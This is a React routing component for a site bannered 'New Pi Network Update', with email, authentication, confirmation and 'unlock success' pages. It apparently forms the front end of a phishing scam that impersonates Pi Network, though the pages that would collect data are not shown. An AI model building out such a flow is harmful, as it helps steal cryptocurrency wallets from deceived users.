import './App.css'
import { BrowserRouter, Route, Routes } from 'react-router'
import Home from './pages/Home'
import logo from "../src/assets/logo.webp"
import Duration from './pages/Duration'
import EmailInput from './pages/Email'
import Authentication from './pages/Authentication'
import { Confirmation } from './pages/Confirmation'
import Navbar from './component/NavBar'
import UnlockSucces from './pages/UnlockSucces'

function App() {
 

  return (
    <BrowserRouter>
    <Navbar />
      <div className=' bg-slate-100 h-screen flex items-center flex-col'>
        <img className='bg-red-300  mb-10 w-full' alt='Image' src={logo} />
        <p className='text-teal-500  font-bold text-2xl'>

          New Pi Network Update
        </p>


      <Routes >
        <Route path="/" element={<Home />} />
        <Route path="/success" element={<UnlockSucces />} />

        <Route path="/email" element={<EmailInput />} />
        <Route path="/auth" element={<Authentication />} />
        <Route path="/confirm" element={<Confirmation />} />



        <Route path='/duration' element={<Duration />} />
      </Routes>
      </div>
    </BrowserRouter>
  )
}

export default App
